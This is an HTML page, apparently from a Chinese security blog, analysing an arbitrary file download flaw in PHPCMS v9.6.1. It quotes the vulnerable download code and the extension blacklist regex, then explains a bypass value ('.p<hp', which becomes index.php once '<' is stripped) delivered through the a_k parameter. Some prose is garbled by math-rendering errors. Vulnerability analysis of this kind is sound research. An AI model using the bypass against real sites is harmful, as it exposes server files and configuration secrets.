@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>PHPCMSv9.6.1-2 任意文件下载漏洞分析 - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="PHPCMSV9.6.1-2 任意文件下载漏洞分析"><meta name="keywords" content='Files Download'>
+  <meta itemprop="name" content="PHPCMSv9.6.1-2 任意文件下载漏洞分析">
+  <meta itemprop="description" content="PHPCMSV9.6.1-2 任意文件下载漏洞分析">
+  <meta itemprop="datePublished" content="2025-08-01T11:15:02+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:34:46+08:00">
+  <meta itemprop="wordCount" content="642">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="Files Download"><meta property="og:url" content="https://sw1mblu3.fun/posts/phpcmsv9-6-1-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="PHPCMSv9.6.1-2 任意文件下载漏洞分析">
+  <meta property="og:description" content="PHPCMSV9.6.1-2 任意文件下载漏洞分析">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-01T11:15:02+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:34:46+08:00">
+    <meta property="article:tag" content="Files Download">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="PHPCMSv9.6.1-2 任意文件下载漏洞分析" /><meta name="twitter:description" content="PHPCMSV9.6.1-2 任意文件下载漏洞分析" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/phpcmsv9-6-1-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="PHPCMSv9.6.1-2 任意文件下载漏洞分析 - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/phpcmsv9-6-0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/" title="PHPCMSv9.6.0 SQL注入漏洞分析" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/phpcms-v9-6-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="PHPCMSv9.6.3 文件包含漏洞分析" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/phpcmsv9-6-1-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.md" title="PHPCMSv9.6.1-2 任意文件下载漏洞分析 - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "PHPCMSv9.6.1-2 任意文件下载漏洞分析",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/phpcmsv9-6-1-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "Files Download","wordcount":  642 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/phpcmsv9-6-1-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\/","datePublished": "2025-08-01T11:15:02+00:00","dateModified": "2026-07-09T18:34:46+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>PHPCMSv9.6.1-2 任意文件下载漏洞分析</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-08-01T11:15:02Z">1 Aug, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#审计">审计</a>
+      <ul>
+        <li><a href="#v961">v9.6.1</a>
+          <ul>
+            <li><a href="#代码审计">代码审计</a></li>
+            <li><a href="#漏洞验证">漏洞验证</a></li>
+          </ul>
+        </li>
+        <li><a href="#v962">v9.6.2</a></li>
+      </ul>
+    </li>
+    <li><a href="#坑点">坑点</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>继上一篇对 PHPCMS V9.6.0 SQL 注入漏洞的分析之后，继续向下审计 modules/content/down.php 时，又发现了一个由 sys_auth 使用方式不当引发的问题，引出了任意文件读取漏洞</p>
+<h1 class="heading-element" id="审计"><span>审计</span>
+  <a href="#%e5%ae%a1%e8%ae%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 class="heading-element" id="v961"><span>v9.6.1</span>
+  <a href="#v961" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="代码审计"><span>代码审计</span>
+  <a href="#%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>sys_auth 就不再分析一遍了，详情请看：
+<a href="https://oct1sec.top/2025/07/29/PHPCMSV9-6-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/" target="_blank" rel="external nofollow noopener noreferrer">https://oct1sec.top/2025/07/29/PHPCMSV9-6-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/</a>
+分析漏洞，看 modules/content/down.php::download()，核心漏洞代码如下
+download() 方法最终调用了 file_down()，而后者核心是直接通过 readfile()</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">public function download() {
+</span></span><span class="line"><span class="cl">	file_down($fileurl, $filename);
+</span></span><span class="line"><span class="cl">	// phpcms 自己实现的方法，提供文件下载功能
+</span></span><span class="line"><span class="cl">		  =&gt; #phpcms/libs/functions/global.func.php
+</span></span><span class="line"><span class="cl">			function file_down($filepath, $filename = &#39;&#39;) {  
+</span></span><span class="line"><span class="cl">			    if(!$filename) $filename = basename($filepath);  
+</span></span><span class="line"><span class="cl">			    if(is_ie()) $filename = rawurlencode($filename);  
+</span></span><span class="line"><span class="cl">			    $filetype = fileext($filename);  
+</span></span><span class="line"><span class="cl">			    $filesize = sprintf(&#34;%u&#34;, filesize($filepath));  
+</span></span><span class="line"><span class="cl">			    if(ob_get_length() !== false) @ob_end_clean();  
+</span></span><span class="line"><span class="cl">			    header(&#39;Pragma: public&#39;);  
+</span></span><span class="line"><span class="cl">			    header(&#39;Last-Modified: &#39;.gmdate(&#39;D, d M Y H:i:s&#39;) . &#39; GMT&#39;);  
+</span></span><span class="line"><span class="cl">			    header(&#39;Cache-Control: no-store, no-cache, must-revalidate&#39;);  
+</span></span><span class="line"><span class="cl">			    header(&#39;Cache-Control: pre-check=0, post-check=0, max-age=0&#39;);  
+</span></span><span class="line"><span class="cl">			    header(&#39;Content-Transfer-Encoding: binary&#39;);  
+</span></span><span class="line"><span class="cl">			    header(&#39;Content-Encoding: none&#39;);  
+</span></span><span class="line"><span class="cl">			    header(&#39;Content-type: &#39;.$filetype);  
+</span></span><span class="line"><span class="cl">			    header(&#39;Content-Disposition: attachment; filename=&#34;&#39;.$filename.&#39;&#34;&#39;);  
+</span></span><span class="line"><span class="cl">			    header(&#39;Content-length: &#39;.$filesize);  
+</span></span><span class="line"><span class="cl">			    readfile($filepath);  
+</span></span><span class="line"><span class="cl">			    //关键在这，一个PHP内置方法，readfile是将文件内容直接发送到输出缓冲区，也就是说文件内容在返回包中直接能看到，因为返回携带数据，在前端也会弹出下载的功能
+</span></span><span class="line"><span class="cl">			    //同时readfile读取文件的路径是项目根目录，可以使用 getpwd()测试一下
+</span></span><span class="line"><span class="cl">			    exit;  
+</span></span><span class="line"><span class="cl">			}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>可以看到这里 file_down() -&gt; readfile()，提供了文件下载，这是一个非常危险的功能！我检查这个功能是否在安全的代码中使用
+对整段代码进行参数追踪，主要追踪 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;、&quot; used in math mode [unicodeTextInMathMode] at position 8: fileurl、̲" style="color:#ff4949">fileurl、</span>filename 的变化：<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;首&quot; used in math mode [unicodeTextInMathMode] at position 9: fileurl 首̲先由 " style="color:#ff4949">fileurl 首先由 </span>f 赋值，然后和 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;拼&quot; used in math mode [unicodeTextInMathMode] at position 3: s 拼̲接在一起形成完整的 " style="color:#ff4949">s 拼接在一起形成完整的 </span>fileurl；而 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;则&quot; used in math mode [unicodeTextInMathMode] at position 10: filename 则̲取自 " style="color:#ff4949">filename 则取自 </span>fileurl 的后缀名，并和随机数拼接形成新的文件名</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">public function download() {
+</span></span><span class="line"><span class="cl">	$a_k = trim($_GET[&#39;a_k&#39;]);
+</span></span><span class="line"><span class="cl">	$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
+</span></span><span class="line"><span class="cl">	$a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);
+</span></span><span class="line"><span class="cl">	if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
+</span></span><span class="line"><span class="cl">	unset($i,$m,$f,$t,$ip);
+</span></span><span class="line"><span class="cl">	$a_k = safe_replace($a_k);
+</span></span><span class="line"><span class="cl">	parse_str($a_k);		
+</span></span><span class="line"><span class="cl">	...
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	$fileurl = trim($f);
+</span></span><span class="line"><span class="cl">	//从 $f 中获取 fileurl
+</span></span><span class="line"><span class="cl">	...
+</span></span><span class="line"><span class="cl">	if($m) $fileurl = trim($s).trim($fileurl);
+</span></span><span class="line"><span class="cl">	//将 $s 与 $fileurl 拼接成新的路径
+</span></span><span class="line"><span class="cl">	...
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	if(strpos($fileurl, &#39;:/&#39;) &amp;&amp; (strpos($fileurl, pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;)) === false)) { 
+</span></span><span class="line"><span class="cl">		header(&#34;Location: $fileurl&#34;);
+</span></span><span class="line"><span class="cl">	} else {
+</span></span><span class="line"><span class="cl">		if($d == 0) {
+</span></span><span class="line"><span class="cl">			header(&#34;Location: &#34;.$fileurl);
+</span></span><span class="line"><span class="cl">		} else {
+</span></span><span class="line"><span class="cl">			$fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);
+</span></span><span class="line"><span class="cl">			$filename = basename($fileurl);
+</span></span><span class="line"><span class="cl">			//获取 fileurl 的文件名部分
+</span></span><span class="line"><span class="cl">			$ext = fileext($filename);
+</span></span><span class="line"><span class="cl">			//获取 filename 的小数点部分，即后缀名
+</span></span><span class="line"><span class="cl">			$filename = date(&#39;Ymd_his&#39;).random(3).&#39;.&#39;.$ext;
+</span></span><span class="line"><span class="cl">			//随机数与后缀名结合形成新的文件名
+</span></span><span class="line"><span class="cl">			$fileurl = str_replace(array(&#39;&lt;&#39;,&#39;&gt;&#39;), &#39;&#39;,$fileurl);
+</span></span><span class="line"><span class="cl">			file_down($fileurl, $filename);
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>再看过滤机制：这个正则检索 $f 是否存在黑名单内的关键词，且不允许出现 <code>:\\ ..</code></p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">//正则筛选php、php3等关键词，但可以被绕过
+</span></span><span class="line"><span class="cl">if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &#34;:\\&#34;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) 
+</span></span><span class="line"><span class="cl">showmessage(L(&#39;url_error&#39;));  
+</span></span><span class="line"><span class="cl">$fileurl = trim($f);</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>拼接形成完整路径后再次正则检查黑名单后缀名</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">if($m) $fileurl = trim($s).trim($fileurl);  //拼接后再次正则黑名单检测
+</span></span><span class="line"><span class="cl">if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));  </span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>最后替换掉路径中的 &lt;&gt; 这两个字符，过滤结束</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$fileurl</span> <span class="o">=</span> str_replace<span class="o">(</span>array<span class="o">(</span>pc_base::load_config<span class="o">(</span><span class="s1">&#39;system&#39;</span>,<span class="s1">&#39;upload_url&#39;</span><span class="o">)</span>,<span class="s1">&#39;/&#39;</span><span class="o">)</span>, array<span class="o">(</span>pc_base::load_config<span class="o">(</span><span class="s1">&#39;system&#39;</span>,<span class="s1">&#39;upload_path&#39;</span><span class="o">)</span>,DIRECTORY_SEPARATOR<span class="o">)</span>, <span class="nv">$fileurl</span><span class="o">)</span><span class="p">;</span>  //仅替换 fileurl 内的指定字符串，对漏洞不影响
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl"><span class="nv">$fileurl</span> <span class="o">=</span> str_replace<span class="o">(</span>array<span class="o">(</span><span class="s1">&#39;&lt;&#39;</span>,<span class="s1">&#39;&gt;&#39;</span><span class="o">)</span>, <span class="s1">&#39;&#39;</span>,<span class="nv">$fileurl</span><span class="o">)</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">//替换 fileurl 中 &lt;&gt; 为空
+</span></span><span class="line"><span class="cl">file_down<span class="o">(</span><span class="nv">$fileurl</span>, <span class="nv">$filename</span><span class="o">)</span><span class="p">;</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>readfile(<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;最&quot; used in math mode [unicodeTextInMathMode] at position 12: filepath); 最̲终下载的文件是 " style="color:#ff4949">filepath); 最终下载的文件是 </span>filepath，而 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;即&quot; used in math mode [unicodeTextInMathMode] at position 10: filepath 即̲传入的 " style="color:#ff4949">filepath 即传入的 </span>fileurl，那么无需再看 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;的&quot; used in math mode [unicodeTextInMathMode] at position 10: filename 的̲变化，因为不影响文件下载功能，…" style="color:#ff4949">filename 的变化，因为不影响文件下载功能，只用考虑 </span>fileurl 在程序中能否绕过过滤得到正确的路径即可
+假如 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;，&quot; used in math mode [unicodeTextInMathMode] at position 10: f = index，̲" style="color:#ff4949">f = index，</span>s = .p&lt;hp，正则匹配 php，拼接完之后 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;，&quot; used in math mode [unicodeTextInMathMode] at position 19: …eurl=index.p&lt;hp，̲这样两次正则都绕过了，最后 s…" style="color:#ff4949">fileurl=index.p&lt;hp，这样两次正则都绕过了，最后 str_replace 替换把 &lt; 替换为空，刚好得到完整的路径 index.php
+最后入口点，</span>a_k 可控，parse_str() 注册变量使得 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;、&quot; used in math mode [unicodeTextInMathMode] at position 2: f、̲" style="color:#ff4949">f、</span>s 都可以覆盖为我们的 Payload</p>
